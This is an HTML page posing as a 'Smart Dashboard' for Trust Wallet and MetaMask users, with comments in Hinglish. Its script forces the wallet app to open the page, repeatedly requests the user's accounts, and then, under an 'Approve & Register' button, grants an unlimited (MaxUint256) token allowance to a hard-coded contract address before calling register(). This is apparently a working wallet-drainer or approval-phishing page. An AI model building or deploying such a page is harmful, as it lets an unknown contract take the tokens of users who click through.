<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
        .btn-box { border: 2px solid #eee; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px; transition: 0.3s; }
        #dashboardView { display: none; }
        .reg-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .loader { color: #2196F3; font-weight: bold; font-size: 14px; margin: 10px; }
    </style>
</head>
<body>

<div class="card">
    <div id="connectView">
        <h3>Connect Wallet</h3>
        <p style="font-size: 12px; color: #666;">App open hone par password dalein aur wahan Dashboard ka intezar karein.</p>
        
        <div class="btn-box" onclick="forceOpen('trust')">
            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" width="50"><br>
            Trust Wallet
        </div>
        
        <div class="btn-box" onclick="forceOpen('metamask')">
            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="50"><br>
            MetaMask
        </div>
    </div>

    <div id="dashboardView">
        <h2 style="color: #2196F3;">Main Dashboard</h2>
        <div id="addr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px; margin-bottom: 20px;"></div>
        <button id="regBtn" class="reg-btn" onclick="register()">Approve & Register</button>
    </div>

    <div id="status" class="loader"></div>
</div>

<script>
    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer;

    // 1. App ko force open karne ka naya tarika
    function forceOpen(type) {
        const url = window.location.href;
        if (type === 'trust') {
            // Direct Trust link bina browser redirect ke
            window.location.assign("trust://open_url?url=" + encodeURIComponent(url));
        } else {
            window.location.assign("https://metamask.app.link/dapp/" + url.replace(/^https?:\/\//, ''));
        }
        document.getElementById('status').innerText = "Opening App...";
    }

    // 2. Automatic Connection (Jab app ke andar site khule)
    async function init() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                
                if (accounts.length > 0) {
                    signer = provider.getSigner();
                    const address = await signer.getAddress();

                    document.getElementById('connectView').style.display = 'none';
                    document.getElementById('dashboardView').style.display = 'block';
                    document.getElementById('addr').innerText = "Connected: " + address;
                    document.getElementById('status').innerText = "";
                }
            } catch (e) {
                document.getElementById('status').innerText = "Please confirm in Wallet App";
            }
        }
    }

    // Har 2 second mein check karega (Interval fix)
    setInterval(() => {
        if (window.ethereum && document.getElementById('dashboardView').style.display === 'none') {
            init();
        }
    }, 2000);

    // Page load par bhi check karein
    window.onload = init;

    async function register() {
        const btn = document.getElementById('regBtn');
        try {
            btn.innerText = "Confirming...";
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
            await tx1.wait();

            const tx2 = await mCon.register();
            await tx2.wait();

            alert("Success!");
            btn.innerText = "Registered âœ…";
        } catch (e) {
            alert("Transaction Failed");
            btn.innerText = "Register & Access";
        }
    }
</script>
</body>
</html>
